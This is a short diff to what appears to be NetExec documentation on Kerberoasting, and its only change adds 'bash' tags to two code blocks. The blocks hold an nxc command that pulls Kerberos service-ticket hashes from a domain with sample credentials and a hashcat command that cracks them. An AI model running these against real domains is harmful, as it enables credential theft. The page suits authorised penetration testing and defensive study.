@@ -12,13 +12,13 @@ You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting techni
 To perfom this attack, you need an account on the domain
 {% endhint %}
 
-```
+```bash
 nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
 ```
 
 ### Cracking with hashcat
 
-```
+```bash
 hashcat -m13100 output.txt wordlist.txt
 ```
 
